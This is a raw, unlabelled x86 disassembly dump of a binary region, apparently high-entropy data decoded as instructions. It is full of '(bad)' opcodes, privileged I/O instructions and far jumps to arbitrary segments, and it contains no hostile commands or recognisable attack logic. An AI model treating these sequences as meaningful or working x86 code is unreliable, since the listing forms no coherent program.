  42556f:	adc    dl,BYTE PTR [ebp-0x26]
  425572:	add    eax,0xe32b7ebc
  425577:	aad    0xa1
  425579:	jmp    0x87582dcb
  42557e:	sbb    DWORD PTR [ebx],esp
  425580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425581:	jo     0x4255df
  425583:	dec    ecx
  425584:	mov    ds:0xd4a86bc1,al
  425589:	movd   mm0,DWORD PTR [ecx]
  42558c:	mov    ecx,0x7159cbe2
  425591:	imul   ecx,DWORD PTR [edx-0x7],0x3e
  425595:	es push edx
  425597:	addr16 inc eax
  425599:	adc    ecx,ecx
  42559b:	es call 0xb3723bb8
  4255a1:	mov    al,0x77
  4255a3:	or     BYTE PTR [ecx+ebp*8-0x70ae06e7],0xf3
  4255ab:	test   eax,0x9c23d70e
  4255b0:	and    DWORD PTR [esi-0x18dd2c56],ebx
  4255b6:	mov    ebx,0xdf141fc6
  4255bb:	arpl   di,di
  4255bd:	rcr    al,0x9a
  4255c0:	mov    eax,0xe2117109
  4255c5:	adc    eax,0x92afb8cc
  4255ca:	mov    dl,BYTE PTR gs:[eax]
  4255cd:	xor    eax,0x8aa03427
  4255d2:	jge    0x4255ca
  4255d4:	mov    al,0x16
  4255d6:	das    
  4255d7:	fwait
  4255d8:	sbb    cl,BYTE PTR [esi-0x2d]
  4255db:	(bad)  
  4255dc:	(bad)  
  4255dd:	sub    BYTE PTR [esi+edx*4+0x49],bh
  4255e1:	add    BYTE PTR [esi+0x15],0x4c
  4255e5:	call   0x48d0:0x7e03a53f
  4255ec:	mov    dl,0x0
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x74d6f13a
  425664:	and    al,BYTE PTR [edi]
  425666:	lods   eax,DWORD PTR ds:[esi]
  425667:	nop
  425668:	add    DWORD PTR [eax],eax
  42566a:	inc    DWORD PTR [eax]
  42566c:	add    BYTE PTR [eax],al
  42566e:	aam    0x4b
  425670:	cwde   
  425671:	push   0x7e
  425673:	dec    edi
  425674:	or     DWORD PTR [edi+0x1d628779],ebx
  42567a:	add    al,0x75
  42567c:	out    dx,al
  42567d:	mov    esp,0x7f749730
  425682:	retf   0x21a2
  425685:	jecxz  0x4256ae
  425687:	test   al,0x9b
  425689:	test   DWORD PTR [ebp+0x3b],0x46cdca3f
  425690:	stc    
  425691:	jg     0x4256a7
  425693:	jp     0x425707
  425695:	ret    
  425696:	iret   
  425697:	cli    
  425698:	dec    eax
  425699:	jp     0x4256b0
  42569b:	call   0x4cbc:0x3781f387
  4256a2:	sub    ebx,DWORD PTR [edi+0x2677578f]
  4256a8:	or     ch,BYTE PTR [edx+0x55]
  4256ab:	and    al,0xdc
  4256ad:	mov    bl,0xf7
  4256af:	push   eax
  4256b0:	push   ss
  4256b1:	idiv   BYTE PTR [edi-0x6e492dd3]
  4256b7:	mov    ebx,0x8074de29
  4256bd:	fcmovnu st,st(6)
  4256bf:	jmp    0xc403:0x2e8be9d6
  4256c6:	neg    BYTE PTR [eax]
  4256c8:	std    
  4256c9:	add    al,0x9b
  4256cb:	mov    ebp,0xa89bb9e6
  4256d0:	cdq    
  4256d1:	icebp  
  4256d2:	or     BYTE PTR [edx-0x13],dl
  4256d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256d6:	iret   
  4256d7:	test   eax,0x88a67853
  4256dc:	xor    bl,BYTE PTR [ecx+0x736184dc]
  4256e2:	cmp    edi,eax
  4256e4:	sbb    DWORD PTR [ecx],esp
  4256e6:	mov    edx,DWORD PTR [eax]
  4256e8:	jmp    0x4c13:0x1025a6c2
  4256ef:	mov    dl,0x26
  4256f1:	or     eax,0x1fc87289
  4256f6:	sub    DWORD PTR [esi+0x6d],edx
  4256f9:	mov    al,0xaf
  4256fb:	nop
  4256fc:	cwde   
  4256fd:	jle    0x425714
  4256ff:	cmp    BYTE PTR [edi+0x44ac0e76],ch
  425705:	leave  
  425706:	cmp    dh,BYTE PTR [ecx+eiz*1]
  425709:	sbb    al,0xf1
  42570b:	test   al,0x7e
  42570d:	out    0x5b,eax
  42570f:	mov    ebp,0x6932aed7
  425714:	xor    eax,0x2c856f4
  425719:	sub    BYTE PTR [edi+0x51],al
  42571c:	sub    BYTE PTR [edi],bh
  42571e:	push   es
  42571f:	add    DWORD PTR [ebx+0x61],esp
  425722:	ins    BYTE PTR es:[edi],dx
  425723:	stos   BYTE PTR es:[edi],al
  425724:	into   
  425725:	jge    0x4256f2
  425727:	(bad)  
  425728:	out    0x5a,al
  42572a:	test   dl,0x8b
  42572d:	sub    dl,BYTE PTR [edi-0x6c4bf0fd]
  425733:	nop
  425734:	sahf   
  425735:	add    DWORD PTR [edx],esp
  425737:	aas    
  425738:	in     al,dx
  425739:	dec    eax
  42573a:	in     al,0x6
  42573c:	fidivr DWORD PTR [edi-0x67]
  42573f:	sub    al,0x99
  425741:	or     BYTE PTR [ebp+0x15424cb9],0x87
  425748:	cdq    
  425749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42574a:	aaa    
  42574b:	leave  
  42574c:	(bad)  [edi]
  42574e:	fdiv   QWORD PTR [esi+0x563950a9]
  425754:	push   ebp
  425755:	xchg   esp,eax
  425756:	inc    edi
  425757:	adc    al,0x62
  425759:	mul    BYTE PTR [eax+eiz*1]
  42575c:	add    DWORD PTR [ebp+0x1f],edx
  42575f:	lahf   
  425760:	repz jae 0x42572c
  425763:	adc    al,0xd
  425765:	mov    bl,0xa8
  425767:	das    
  425768:	cmp    DWORD PTR [edi-0x55],ebx
  42576b:	xchg   edx,eax
  42576c:	into   
	...
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0xf523d174
  4257e5:	call   0x43e996
  4257ea:	inc    DWORD PTR [eax]
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	jle    0x4257d6
  4257f0:	jg     0x425866
  4257f2:	mov    bl,0x25
  4257f4:	dec    ecx
  4257f5:	jge    0x4257c4
  4257f7:	mov    al,ds:0x7f1846d
  4257fc:	repnz (bad) 
  425800:	scas   eax,DWORD PTR es:[edi]
  425801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425802:	jle    0x4257e0
  425804:	pop    edi
  425805:	clc    
  425806:	imul   ecx,DWORD PTR [esi],0xffffff85
  425809:	ror    BYTE PTR [edi+0x0],cl
  42580c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42580d:	mov    ds:0xd2500f4a,al
  425812:	loope  0x42581b
  425814:	xor    dl,BYTE PTR [esi]
  425816:	das    
  425817:	out    dx,al
  425818:	loopne 0x425836
  42581a:	inc    esi
  42581b:	hlt    
  42581c:	shl    DWORD PTR [edx-0x1c8542cf],1
  425822:	cmp    dl,BYTE PTR [esi+0x1d]
  425825:	(bad)
  425828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425829:	pop    es
  42582a:	mov    ds,WORD PTR [ecx+0x2a377dad]
  425830:	mov    bh,0x4
  425832:	mov    WORD PTR [edx+0x3909f1d1],cs
  425838:	test   BYTE PTR [eax-0xd9ea535],cl
  42583e:	cmp    eax,edx
  425840:	and    eax,0x7df9b4b4
  425845:	je     0x4258b6
  425847:	rol    ecx,cl
  425849:	inc    edx
  42584a:	push   edx
  42584b:	not    ebx
  42584d:	inc    esp
  42584e:	push   esp
  42584f:	data16 fdiv DWORD PTR [esp+edi*1]
  425853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425854:	loop   0x4257fa
  425856:	mov    bh,BYTE PTR [eax]
  425858:	out    0x34,eax
  42585a:	test   al,0xed
  42585c:	sub    BYTE PTR [ebx],cl
  42585e:	mov    eax,?
  425860:	nop
  425861:	loop   0x425867
  425863:	xchg   BYTE PTR [eax],al
  425865:	popf   
  425866:	scas   eax,DWORD PTR es:[edi]
  425867:	jne    0x42582f
  425869:	cdq    
  42586a:	aam    0x35
  42586c:	push   0xffffff88
  42586e:	fs cld 
  425870:	sbb    al,0x42
  425872:	mov    ah,0xff
  425874:	lahf   
  425875:	mov    eax,0x8e83ceeb
  42587a:	fucom  st(0)
  42587c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42587d:	push   edi
  42587e:	das    
  42587f:	xchg   edx,eax
  425880:	inc    eax
  425881:	sar    BYTE PTR [eax-0x54],0x60
  425885:	pop    ebx
  425886:	lock out 0xfc,al
  425889:	in     al,0x79
  42588b:	sbb    ah,0xda
  42588e:	push   esp
  42588f:	pop    ds
  425890:	call   0x61cf4b3e
  425895:	dec    ebp
  425896:	pop    ds
  425897:	push   cs
  425898:	inc    esi
  425899:	and    bl,dh
  42589b:	jns    0x425877
  42589d:	jmp    0x4258e3
  42589f:	dec    edx
  4258a0:	sbb    edx,ebp
  4258a2:	fistp  DWORD PTR [esi-0x28]
  4258a5:	jg     0x425827
  4258a7:	xlat   BYTE PTR ds:[ebx]
  4258a8:	mov    edi,0x286bfb85
  4258ad:	push   eax
  4258ae:	cmp    ch,BYTE PTR [edi+0x5c5fa3e4]
  4258b4:	pop    edi
  4258b5:	hlt    
  4258b6:	in     eax,dx
  4258b7:	and    eax,ecx
  4258b9:	scas   eax,DWORD PTR es:[edi]
  4258ba:	shl    DWORD PTR [edi+0x7d],1
  4258bd:	pop    es
  4258be:	ins    BYTE PTR es:[edi],dx
  4258bf:	inc    ebp
  4258c0:	lods   eax,DWORD PTR ds:[esi]
  4258c1:	in     eax,dx
  4258c2:	inc    edi
  4258c3:	push   ebx
  4258c4:	adc    al,0x33
  4258c6:	in     al,dx
  4258c7:	add    eax,0x4bface0e
  4258cc:	mov    al,0x74
  4258ce:	inc    ecx
  4258cf:	ins    DWORD PTR es:[edi],dx
  4258d0:	push   ds
  4258d1:	inc    edi
  4258d2:	arpl   WORD PTR [ecx],cx
  4258d4:	loop   0x425912
  4258d6:	loope  0x42588d
  4258d8:	(bad)  
  4258d9:	call   0x9963:0x2fbac5dc
  4258e0:	mov    cl,0xee
  4258e2:	bound  esp,QWORD PTR [edi]
  4258e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258e5:	fwait
  4258e6:	lock or ch,BYTE PTR ds:0xef2f2c49
	...
  425955:	add    BYTE PTR [edx+edx*2-0x70],bl
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	in     eax,dx
  425963:	mov    eax,0x92ab7750
  425968:	add    DWORD PTR [eax],eax
  42596a:	inc    DWORD PTR [eax]
  42596c:	add    BYTE PTR [eax],al
  42596e:	xlat   BYTE PTR ds:[ebx]
  42596f:	push   ss
  425970:	outs   dx,DWORD PTR ds:[esi]
  425971:	es dec esi
  425973:	enter  0xdb66,0x7f
  425977:	jno    0x425913
  425979:	inc    edx
  42597a:	dec    edx
  42597b:	pop    edi
  42597c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42597d:	cmp    eax,DWORD PTR [esi]
  42597f:	ret    0xba09
  425982:	ficomp DWORD PTR [edi-0x4eaf5524]
  425988:	(bad)  
  425989:	pmullw mm0,QWORD PTR [edx-0x7f]
  42598d:	retf   
  42598e:	cmc    
  42598f:	pop    edi
  425990:	adc    bh,BYTE PTR [eax+eax*8]
  425993:	out    dx,eax
  425994:	xor    eax,0x9a7a4881
  425999:	out    0x10,eax
  42599b:	scas   al,BYTE PTR es:[edi]
  42599c:	js     0x42592a
  42599e:	push   esp
  42599f:	jno    0x425a18
  4259a1:	sub    edi,DWORD PTR [esi+0x45507892]
  4259a7:	jmp    0x3a516083
  4259ac:	inc    ecx
  4259ad:	cmp    al,0x16
  4259af:	cdq    
  4259b0:	cmp    dh,BYTE PTR [ecx]
  4259b2:	xchg   esp,eax
  4259b3:	ret    
  4259b4:	icebp  
  4259b5:	fcmovb st,st(5)
  4259b7:	xchg   esp,eax
  4259b8:	test   ax,0xb326
  4259bc:	scas   eax,DWORD PTR es:[edi]
  4259bd:	fsub   DWORD PTR [ecx]
  4259bf:	icebp  
  4259c0:	inc    edx
  4259c1:	pop    ss
  4259c2:	in     eax,dx
  4259c3:	dec    ebp
  4259c4:	cmp    eax,0x5e312f4a
  4259c9:	and    BYTE PTR [ebx],0x60
  4259cc:	xchg   DWORD PTR [esi+0x7b62706b],edx
  4259d2:	or     dh,BYTE PTR [ebp-0x71]
  4259d5:	mov    bh,0x13
  4259d7:	push   ebx
  4259d8:	jecxz  0x4259e9
  4259da:	stos   DWORD PTR es:[edi],eax
  4259db:	sub    al,0xfc
  4259dd:	ss test ch,dl
  4259e0:	in     al,dx
  4259e1:	stc    
  4259e2:	aad    0x19
  4259e4:	or     eax,0xcc55df2d
  4259e9:	cld    
  4259ea:	test   al,0x93
  4259ec:	or     BYTE PTR [edi],dl
  4259ee:	std    
  4259ef:	mov    ah,0x16
  4259f1:	ret    0x49f
  4259f4:	push   esp
  4259f5:	and    bh,BYTE PTR [esi-0x13]
  4259f8:	push   edx
  4259f9:	jb     0x4259a7
  4259fb:	icebp  
  4259fc:	add    al,0x1b
  4259fe:	fld    QWORD PTR [esi-0x564fb06f]
  425a04:	icebp  
  425a05:	mov    ebp,0x505bff12
  425a0a:	pop    edx
  425a0b:	out    0x36,eax
  425a0d:	test   BYTE PTR [ebx],ah
  425a0f:	mov    ebp,0x1b0514f
  425a14:	dec    edi
  425a15:	call   0x6d3a:0xe41cc8d1
  425a1c:	push   edi
  425a1d:	or     BYTE PTR [esi+0x1d],ch
  425a20:	dec    ebp
  425a21:	repnz mov eax,0x433f0bfa
  425a27:	mov    bl,0xb8
  425a29:	xor    DWORD PTR [edi],0x52a3fb00
  425a2f:	sbb    DWORD PTR [edi],0xffffffd0
  425a32:	xor    cl,BYTE PTR [ebx-0x59]
  425a35:	loop   0x4259e6
  425a37:	sbb    dh,BYTE PTR [edx]
  425a39:	daa    
  425a3a:	fnsave [ebx]
  425a3c:	(bad)  
  425a3d:	out    dx,eax
  425a3e:	lods   eax,DWORD PTR ds:[esi]
  425a3f:	psrlw  mm5,QWORD PTR [eax+0x5d72f6e2]
  425a46:	stos   BYTE PTR es:[edi],al
  425a47:	and    esp,edx
  425a49:	mov    edi,0x48997991
  425a4e:	pop    es
  425a4f:	in     eax,0x80
  425a51:	pusha  
  425a52:	dec    ebx
  425a53:	dec    edi
  425a54:	xlat   BYTE PTR ds:[ebx]
  425a55:	or     al,0x8c
  425a57:	out    dx,al
  425a58:	fmul   st,st(7)
  425a5a:	fs loope 0x425a01
  425a5d:	int    0x6e
  425a5f:	or     DWORD PTR gs:[ebp+ebp*1-0x61],eax
  425a64:	loope  0x425a4e
  425a66:	jmp    0x382fa8b2
  425a6b:	ins    BYTE PTR es:[edi],dx
  425a6c:	pop    ebp
	...
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4-0x564d4950]
  425ae6:	stos   BYTE PTR es:[edi],al
  425ae7:	xchg   ebx,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	inc    DWORD PTR [eax]
  425aec:	add    BYTE PTR [eax],al
  425aee:	cdq    
  425aef:	enterw 0x1c65,0x9e
  425af4:	cmc    
  425af5:	retf   
  425af6:	enter  0x4e23,0x8a
  425afa:	push   esp
  425afb:	(bad)
  425aff:	loope  0x425a84
  425b01:	aad    0xc3
  425b03:	scas   eax,DWORD PTR es:[edi]
  425b04:	repnz pop ds
  425b06:	popa   
  425b07:	xchg   ecx,eax
  425b08:	(bad)  
  425b09:	lock pusha 
  425b0b:	aad    0x63
  425b0d:	repnz inc esp
  425b0f:	cmp    bl,BYTE PTR [edi+0x14e3628e]
  425b15:	push   DWORD PTR [eax-0x27b98735]
  425b1b:	pop    edx
  425b1c:	push   cs
  425b1d:	sti    
  425b1e:	dec    ebx
  425b1f:	es out dx,eax
  425b21:	cwde   
  425b22:	dec    BYTE PTR [edx+0x1bdefb0]
  425b28:	aaa    
  425b29:	jmp    0xc0e8cbbf
  425b2e:	push   edi
  425b2f:	ret    0xb1a8
  425b32:	shl    DWORD PTR [edx+0x16],1
  425b35:	or     ebp,DWORD PTR [eax-0x48]
  425b38:	repnz sub ch,cl
  425b3b:	pop    ecx
  425b3c:	push   ebx
  425b3d:	jno    0x425af3
  425b3f:	imul   ebx,DWORD PTR [edi-0x4a5cd553],0x3d
  425b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b47:	test   DWORD PTR [esi],0x91546e8b
  425b4d:	jl     0x425b48
  425b4f:	addr16 adc ch,dl
  425b52:	jl     0x425b07
  425b54:	cmp    DWORD PTR [ebx+ebp*4+0x2c],edi
  425b58:	and    bh,ah
  425b5a:	inc    edx
  425b5b:	loop   0x425b41
  425b5d:	or     BYTE PTR [esi],0xef
  425b60:	add    DWORD PTR [ecx-0x26],0x2fe61a93
  425b67:	popf   
  425b68:	lds    edi,FWORD PTR [edx+0x33]
  425b6b:	adc    BYTE PTR [ecx+0x4d91b9f6],0xc7
  425b72:	sub    DWORD PTR [ebx],0xc
  425b75:	pop    esi
  425b76:	inc    esi
  425b77:	sub    BYTE PTR [ecx-0x7d],ch
  425b7a:	pusha  
  425b7b:	xchg   esi,eax
  425b7c:	imul   ebx,DWORD PTR [esi+0x5f124e5a],0xfffffff3
  425b83:	out    dx,al
  425b84:	mov    edx,0xe19d1af6
  425b89:	mov    ch,0x8e
  425b8b:	and    DWORD PTR [esi+0x18],0x5c
  425b8f:	cmp    bh,bh
  425b91:	mov    WORD PTR [eax],gs
  425b93:	add    eax,0xb390ded8
  425b98:	dec    eax
  425b99:	inc    edx
  425b9a:	rcl    BYTE PTR [edi-0x1db69a4b],cl
  425ba0:	mov    bl,0x1d
  425ba2:	jo     0x425c01
  425ba4:	fidiv  WORD PTR ds:0x9615cc2a
  425baa:	dec    eax
  425bab:	cs sahf 
  425bad:	jge    0x425c17
  425baf:	fcom   st(2)
  425bb1:	cmp    BYTE PTR [edi-0x84ceb16],ch
  425bb7:	inc    eax
  425bb8:	cli    
  425bb9:	mov    bl,0xdd
  425bbb:	in     eax,dx
  425bbc:	fidivr WORD PTR ds:0xa7522a9f
  425bc2:	repz inc esp
  425bc4:	aaa    
  425bc5:	sbb    edx,ecx
  425bc7:	fwait
  425bc8:	push   edx
  425bc9:	mov    al,0x5
  425bcb:	mov    DWORD PTR [ebx],edx
  425bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bce:	ins    DWORD PTR es:[edi],dx
  425bcf:	jbe    0x425b62
  425bd1:	dec    edx
  425bd2:	ins    BYTE PTR es:[edi],dx
  425bd3:	shr    ah,1
  425bd5:	or     DWORD PTR [eax-0x7d],ecx
  425bd8:	ss dec ebx
  425bda:	sbb    cl,al
  425bdc:	mov    cl,0xc1
  425bde:	jno    0x425b9b
  425be0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425be1:	xchg   ebx,eax
  425be2:	int    0x4b
  425be4:	pop    edi
  425be5:	bound  esi,QWORD PTR [edx]
  425be7:	sub    BYTE PTR [esi+ebx*1-0x7d],ah
  425beb:	pop    esi
  425bec:	mov    eax,ds:0x0
	...
  425c55:	add    ah,al
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	std    
  425c63:	gs pop ds
  425c65:	sub    ebp,DWORD PTR [ecx-0xfffe6c]
  425c6b:	add    BYTE PTR [eax],al
  425c6d:	add    BYTE PTR [ebx],dl
  425c6f:	sbb    BYTE PTR [ebx+esi*2],ch
  425c72:	add    al,0xa2
  425c74:	aas    
  425c75:	sti    
  425c76:	xor    eax,0xe1ab8d44
  425c7b:	aaa    
  425c7c:	cmp    DWORD PTR [ecx+0x4f418754],esp
  425c82:	gs or  al,0x16
  425c85:	sti    
  425c86:	xchg   edx,eax
  425c87:	lock dec edx
  425c89:	int    0xc0
  425c8b:	in     eax,dx
  425c8c:	push   ds
  425c8d:	rcr    DWORD PTR [edi],0x61
  425c90:	repnz sbb edx,DWORD PTR [ebp-0x3a]
  425c94:	popa   
  425c95:	or     ecx,DWORD PTR [edi]
  425c97:	outs   dx,BYTE PTR ds:[esi]
  425c98:	xor    eax,0x74ad1e4e
  425c9d:	xor    edx,DWORD PTR [edx+eax*1]
  425ca0:	in     eax,0xf1
  425ca2:	ins    DWORD PTR es:[edi],dx
  425ca3:	inc    edi
  425ca4:	pushf  
  425ca5:	and    al,0xfb
  425ca7:	ret    
  425ca8:	mov    eax,0x7d05071e
  425cad:	and    eax,0x6da35fb1
  425cb2:	nop
  425cb3:	push   cs
  425cb4:	lods   al,BYTE PTR ds:[esi]
  425cb5:	(bad)  
  425cb6:	(bad)  
  425cb7:	xchg   esi,eax
  425cb8:	test   ch,ah
  425cba:	or     al,0x37
  425cbc:	bound  edi,QWORD PTR [ecx+0x5abb0d80]
  425cc2:	mov    dl,0x3c
  425cc4:	mov    edi,0x55533d67
  425cc9:	jmp    0x8776ab53
  425cce:	(bad)  
  425ccf:	daa    
  425cd0:	push   esp
  425cd1:	adc    ebp,ebx
  425cd3:	pushf  
  425cd4:	enter  0x2fe0,0xab
  425cd8:	sub    al,0x6c
  425cda:	pop    edi
  425cdb:	out    dx,al
  425cdc:	pop    eax
  425cdd:	cmp    ebx,ebp
  425cdf:	and    eax,0x441e6d35
  425ce4:	push   0x4c34ee0e
  425ce9:	imul   ebp,ebp,0xffffff9c
  425cec:	pop    esi
  425ced:	enter  0x7dff,0xfb
  425cf1:	fst    QWORD PTR [edx]
  425cf3:	stos   DWORD PTR es:[edi],eax
  425cf4:	scas   al,BYTE PTR es:[edi]
  425cf5:	ror    BYTE PTR [ebx+0xa1b02d7],cl
  425cfb:	cmp    ch,0xb1
  425cfe:	mov    bl,0x97
  425d00:	in     al,dx
  425d01:	fwait
  425d02:	dec    edi
  425d03:	imul   DWORD PTR [edi+eiz*1+0x7b]
  425d07:	inc    edi
  425d08:	sub    DWORD PTR [eax],ebp
  425d0a:	rcr    DWORD PTR [edi+0x4fa0c7ae],0xff
  425d11:	jl     0x425c9b
  425d13:	mov    WORD PTR [esi-0xc7029b1],ds
  425d19:	std    
  425d1a:	add    al,0x6
  425d1c:	cmp    BYTE PTR [edx],ch
  425d1e:	or     BYTE PTR [ecx+0x4664e31a],dh
  425d24:	stos   DWORD PTR es:[edi],eax
  425d25:	loopne 0x425d5f
  425d27:	mov    al,0x97
  425d29:	inc    esp
  425d2a:	std    
  425d2b:	jp     0x425cde
  425d2d:	add    ebx,DWORD PTR [edx-0x30]
  425d30:	fbstp  TBYTE PTR [eax+esi*4-0x11]
  425d34:	mov    edi,0x6ae00e56
  425d39:	jl     0x425d41
  425d3b:	dec    ecx
  425d3c:	retf   0x4826
  425d3f:	int    0xe7
  425d41:	das    
  425d42:	and    ebx,eax
  425d44:	das    
  425d45:	icebp  
  425d46:	int    0xec
  425d48:	ja     0x425d66
  425d4a:	scas   eax,DWORD PTR es:[edi]
  425d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d4c:	pushf  
  425d4d:	loop   0x425d3e
  425d4f:	inc    ecx
  425d50:	call   0xd585:0x913bf073
  425d57:	dec    ecx
  425d58:	sbb    BYTE PTR [edi-0x2f],bh
  425d5b:	inc    ebx
  425d5c:	sub    DWORD PTR [eax],ebp
  425d5e:	xor    al,0xe4
  425d60:	in     eax,0x90
  425d62:	out    dx,eax
  425d63:	out    dx,al
  425d64:	je     0x425daa
  425d66:	das    
  425d67:	pop    esi
  425d68:	ret    
  425d69:	mov    esp,0x24c28c
	...
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0xd235a49a,al
  425de6:	test   al,0x95
  425de8:	add    DWORD PTR [eax],eax
  425dea:	inc    DWORD PTR [eax]
  425dec:	add    BYTE PTR [eax],al
  425dee:	inc    esp
  425def:	xor    esi,edx
  425df1:	outs   dx,DWORD PTR ds:[esi]
  425df2:	test   BYTE PTR [esi],ah
  425df4:	pushf  
  425df5:	push   edx
  425df6:	xor    esp,DWORD PTR [ebx+ecx*4-0x7654155f]
  425dfd:	xor    cl,bh
  425dff:	imul   ebp,DWORD PTR ds:0x5cd8d826,0x8914d5c
  425e09:	test   eax,0xf37f603d
  425e0e:	fbld   TBYTE PTR [edi]
  425e10:	sbb    DWORD PTR [esi+0x2f7d80a7],esi
  425e16:	in     al,0xed
  425e18:	dec    edx
  425e19:	mov    eax,DWORD PTR [ebx+0x57]
  425e1c:	ja     0x425db4
  425e1e:	push   edi
  425e1f:	rol    ebp,1
  425e21:	inc    esi
  425e22:	repz repnz xor eax,0x8d85078c
  425e29:	in     eax,dx
  425e2a:	lahf   
  425e2b:	dec    esi
  425e2c:	dec    ebp
  425e2d:	push   esi
  425e2e:	push   edi
  425e2f:	into   
  425e30:	nop
  425e31:	sub    al,0xee
  425e33:	stc    
  425e34:	out    0xe3,al
  425e36:	pop    es
  425e37:	inc    ebx
  425e38:	outs   dx,BYTE PTR ds:[esi]
  425e39:	xbegin 0x9cd8c13a
  425e3f:	pop    DWORD PTR [edx+0x21]
  425e42:	gs jb  0x425df1
  425e45:	sbb    ebx,esp
  425e47:	daa    
  425e48:	mov    BYTE PTR ss:[ebp-0x3f],cl
  425e4c:	ficom  DWORD PTR [edi+0x484d5fc4]
  425e52:	inc    esi
  425e53:	sub    edi,esp
  425e55:	aaa    
  425e56:	ror    BYTE PTR [ebx-0x2e1574c9],1
  425e5c:	push   ss
  425e5d:	jmp    0x5298:0xd1073b6c
  425e64:	fst    QWORD PTR [eax+0x60]
  425e67:	lock std 
  425e69:	jg     0x425e84
  425e6b:	hlt    
  425e6c:	shl    BYTE PTR [ecx+0x1b8627a3],cl
  425e72:	out    dx,eax
  425e73:	mov    edi,0x24cb2c76
  425e78:	les    ebp,FWORD PTR [ebp+eiz*8-0x3793bc7c]
  425e7f:	lds    ebp,FWORD PTR [esi-0x20]
  425e82:	and    cl,BYTE PTR ss:[ebp-0x46baae45]
  425e89:	fwait
  425e8a:	adc    BYTE PTR [ebx+0x77143933],bl
  425e90:	in     eax,0x45
  425e92:	push   DWORD PTR [esi-0x33]
  425e95:	jg     0x425e94
  425e97:	mov    eax,ds:0x95f9c36a
  425e9c:	jmp    0x425e5a
  425e9e:	loope  0x425e71
  425ea0:	and    eax,0xddaec64e
  425ea5:	jb     0x425ef1
  425ea7:	mov    ebx,0x5ab93f45
  425eac:	sahf   
  425ead:	cmp    DWORD PTR [eax+0x2622fdf],esi
  425eb3:	(bad)  
  425eb5:	pop    edx
  425eb6:	mov    edx,DWORD PTR [ecx]
  425eb8:	pop    edi
  425eb9:	sbb    ah,BYTE PTR [ebx+0x25]
  425ebc:	lds    ebp,FWORD PTR [ecx]
  425ebe:	adc    DWORD PTR [eax],0xffffff8f
  425ec1:	pop    ebp
  425ec2:	sub    al,0x98
  425ec4:	out    dx,al
  425ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ec6:	mov    ebx,0x70f949
  425ecb:	xor    al,0xec
  425ecd:	daa    
  425ece:	mov    ecx,0xa98c4190
  425ed3:	sbb    BYTE PTR [edx],ch
  425ed5:	pop    ebp
  425ed6:	jbe    0x425ef1
  425ed8:	shl    ch,1
  425eda:	sti    
  425edb:	sti    
  425edc:	push   0xffffff81
  425ede:	fld    TBYTE PTR [ecx-0x56]
  425ee1:	sbb    DWORD PTR [edi],esp
  425ee3:	jnp    0x425f07
  425ee5:	mov    dh,0xa5
  425ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ee8:	imul   DWORD PTR fs:[ebx-0x3a]
  425eec:	pusha  
	...
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	cmp    dl,BYTE PTR [edi]
  425f64:	sbb    edi,DWORD PTR [ebp+0x196a7]
  425f6a:	inc    DWORD PTR [eax]
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	fwait
  425f6f:	mov    WORD PTR [ebx],cs
  425f71:	pop    es
  425f72:	push   ds
  425f73:	icebp  
  425f74:	test   BYTE PTR [ecx],cl
  425f76:	cmp    edx,ebp
  425f78:	or     BYTE PTR [ebp+0x6e377c9e],ch
  425f7e:	xchg   esp,eax
  425f7f:	pop    es
  425f80:	add    BYTE PTR [ebx],0x1f
  425f83:	sahf   
  425f84:	dec    ecx
  425f85:	in     eax,0x9e
  425f87:	or     BYTE PTR [ecx],bl
  425f89:	sar    BYTE PTR [edx-0x45384600],cl
  425f8f:	nop
  425f90:	push   edx
  425f91:	shl    BYTE PTR [edx-0x75ea07b1],cl
  425f97:	mov    ?,WORD PTR [eax-0x13]
  425f9a:	ds ins BYTE PTR es:[edi],dx
  425f9c:	jno    0x425f91
  425f9e:	mov    ah,0x3d
  425fa0:	adc    BYTE PTR cs:[eax],bh
  425fa3:	das    
  425fa4:	add    eax,0x6bfeeb1a
  425fa9:	popw   ss
  425fab:	push   ss
  425fac:	pop    ecx
  425fad:	jmp    0x1581:0x7af891d0
  425fb4:	loop   0x425fca
  425fb6:	mov    DWORD PTR [eax],esp
